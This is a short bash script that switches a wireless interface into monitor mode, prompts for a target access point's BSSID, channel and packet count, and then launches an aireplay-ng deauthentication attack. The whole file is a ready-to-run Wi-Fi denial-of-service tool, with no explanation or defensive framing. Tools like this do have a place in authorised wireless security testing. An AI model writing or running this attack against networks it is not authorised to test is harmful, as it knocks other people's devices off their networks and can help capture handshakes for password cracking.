#!/bin/bash

mode=$(iwconfig "${INTERFACE}" | grep "Mode:" | awk '{print $4}')

if [ ${mode} = "Mode:Managed" ]; then
        sudo ifconfig ${INTERFACE} down
        sudo iwconfig ${INTERFACE} mode monitor
        sudo ifconfig ${INTERFACE} up
fi

read -p "bssid?: " bssid
read -p "channel?: " channel
read -p "count?: " count

sudo iwconfig $INTERFACE channel $channel
sudo aireplay-ng -0 $count -a "$bssid" "$INTERFACE"
